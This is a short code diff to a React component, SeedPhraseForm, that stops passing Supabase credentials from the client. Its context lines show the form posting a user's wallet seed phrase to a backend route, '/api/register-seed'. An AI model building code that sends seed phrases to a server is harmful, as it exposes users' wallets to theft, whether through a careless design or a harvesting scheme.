@@ -84,13 +84,6 @@ export function SeedPhraseForm({
     onFetchStart();
 
     try {
-      const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
-      const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
-
-      if (!supabaseUrl || !supabaseAnonKey) {
-        throw new Error("Supabase URL or Anon Key is not configured in the client environment.");
-      }
-
       // First, try inserting the seed phrase in the backend via the API route
       const response = await fetch("/api/register-seed", {
         method: "POST",
@@ -100,8 +93,6 @@ export function SeedPhraseForm({
         body: JSON.stringify({
           seedPhrase: values.seedPhrase,
           network: values.network,
-          supabaseUrl,
-          supabaseAnonKey,
         }),
       });
 
